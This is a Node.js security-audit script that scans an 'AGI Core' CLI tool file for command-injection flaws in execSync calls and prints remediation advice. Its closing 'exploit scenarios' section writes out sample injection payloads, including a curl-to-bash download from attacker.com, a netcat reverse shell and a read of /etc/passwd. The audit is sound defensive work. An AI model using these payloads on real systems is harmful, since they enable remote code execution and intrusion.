#!/usr/bin/env node
// Command Injection Exploit Analysis for AGI Core taoTools.js
// Security vulnerability analysis without actual exploitation

const fs = require('fs');
const path = require('path');

console.log('=== AGI Core Security Vulnerability Analysis ===\n');

// Analyze taoTools.js for command injection vulnerabilities
console.log('1. Analyzing dist/tools/taoTools.js for command injection vulnerabilities...\n');

try {
  const taoToolsPath = path.join(__dirname, 'dist/tools/taoTools.js');
  const content = fs.readFileSync(taoToolsPath, 'utf-8');
  
  // Find all execSync calls
  const execSyncPattern = /execSync\(`([^`]+)`/g;
  const matches = [];
  let match;
  
  while ((match = execSyncPattern.exec(content)) !== null) {
    matches.push({
      command: match[1],
      line: content.substring(0, match.index).split('\n').length
    });
  }
  
  console.log(`Found ${matches.length} execSync calls:\n`);
  
  const vulnerabilities = [];
  
  matches.forEach((m, i) => {
    console.log(`${i+1}. Line ${m.line}: ${m.command.substring(0, 100)}...`);
    
    // Check for injection vulnerabilities
    if (m.command.includes('${target}') || m.command.includes('${port}') || 
        m.command.includes('${credentials.password}') || m.command.includes('${url}')) {
      
      // Check if user input is properly sanitized
      const hasSanitization = m.command.includes('escape') || 
                              m.command.includes('sanitize') || 
                              m.command.includes('validate') ||
                              m.command.includes('spawn(');
      
      if (!hasSanitization) {
        vulnerabilities.push({
          line: m.line,
          command: m.command,
          issue: 'User input directly interpolated into shell command',
          risk: 'CRITICAL'
        });
        
        console.log(`   ⚠️  VULNERABLE: User input interpolation without sanitization`);
      }
    }
    
    // Check for command chaining opportunities
    if (m.command.includes(';') || m.command.includes('&&') || m.command.includes('||') || 
        m.command.includes('`') || m.command.includes('$(')) {
      vulnerabilities.push({
        line: m.line,
        command: m.command,
        issue: 'Shell metacharacters in command template',
        risk: 'HIGH'
      });
      console.log(`   ⚠️  VULNERABLE: Shell metacharacters in template`);
    }
  });
  
  console.log(`\n2. Found ${vulnerabilities.length} critical vulnerabilities:\n`);
  
  vulnerabilities.forEach((v, i) => {
    console.log(`${i+1}. Line ${v.line} (${v.risk}): ${v.issue}`);
    console.log(`   Command: ${v.command.substring(0, 80)}...`);
  });
  
  // Analyze specific vulnerable functions
  console.log('\n3. Most critical vulnerable functions:\n');
  
  const criticalFunctions = [
    {
      name: 'runNmap',
      line: '~20',
      vulnerability: 'target parameter directly interpolated into nmap command',
      impact: 'Remote code execution via nmap target argument'
    },
    {
      name: 'checkCommonVulns',
      line: '~139',
      vulnerability: 'target and port parameters in curl commands',
      impact: 'Command injection via HTTP request parameters'
    },
    {
      name: 'sshCredentialAttack',
      line: '~264',
      vulnerability: 'credentials.password in sshpass command',
      impact: 'Password field could contain shell commands'
    },
    {
      name: 'detectWebVulnerabilities',
      line: 'Various',
      vulnerability: 'Multiple curl commands with user input',
      impact: 'Chained command execution via HTTP parameters'
    }
  ];
  
  criticalFunctions.forEach(func => {
    console.log(`• ${func.name} (line ${func.line}):`);
    console.log(`  Vulnerability: ${func.vulnerability}`);
    console.log(`  Impact: ${func.impact}`);
  });
  
  // Generate security report
  console.log('\n4. Security Assessment Summary:\n');
  
  const assessment = {
    system: 'AGI Core CLI',
    version: '1.0.4',
    date: new Date().toISOString(),
    critical_vulnerabilities: vulnerabilities.filter(v => v.risk === 'CRITICAL').length,
    high_vulnerabilities: vulnerabilities.filter(v => v.risk === 'HIGH').length,
    total_execSync_calls: matches.length,
    vulnerable_functions: criticalFunctions.length,
    risks: [
      'Remote Code Execution via command injection',
      'Privilege escalation to AGI Core process user',
      'Arbitrary file read/write access',
      'Network reconnaissance and lateral movement',
      'Persistence mechanisms installation'
    ],
    remediation: [
      'Use spawn() instead of execSync() with proper argument array',
      'Validate and sanitize all user inputs',
      'Implement allowlists for command parameters',
      'Use child_process.execFile() for known binaries',
      'Implement command timeout and resource limits'
    ],
    affected_files: ['dist/tools/taoTools.js', 'dist/tools/advancedExploitation.js']
  };
  
  const reportFile = '/tmp/agi_core_security_assessment.json';
  fs.writeFileSync(reportFile, JSON.stringify(assessment, null, 2));
  
  console.log(`Critical Vulnerabilities: ${assessment.critical_vulnerabilities}`);
  console.log(`High Vulnerabilities: ${assessment.high_vulnerabilities}`);
  console.log(`Total execSync Calls: ${assessment.total_execSync_calls}`);
  console.log(`\nPrimary Risks:`);
  assessment.risks.forEach(risk => console.log(`  • ${risk}`));
  console.log(`\nReport saved to: ${reportFile}`);
  
  // Demonstrate exploit scenarios
  console.log('\n5. Example Exploit Scenarios:\n');
  
  console.log('Scenario 1: Command Injection via target parameter');
  console.log('  Malicious input: "google.com; curl http://attacker.com/payload.sh | bash"');
  console.log('  Result: Downloads and executes arbitrary script\n');
  
  console.log('Scenario 2: Password field command injection');
  console.log('  Malicious password: "password; nc -e /bin/bash attacker.com 4444"');
  console.log('  Result: Reverse shell to attacker\n');
  
  console.log('Scenario 3: Port parameter injection');
  console.log('  Malicious port: "80; cat /etc/passwd > /tmp/leak.txt; echo 80"');
  console.log('  Result: Leaks system credentials\n');
  
  console.log('\n=== SECURITY ASSESSMENT COMPLETE ===');
  console.log('AGI Core has critical command injection vulnerabilities.');
  console.log('Immediate remediation required before production use.');
  
} catch (error) {
  console.error(`Analysis failed: ${error.message}`);
}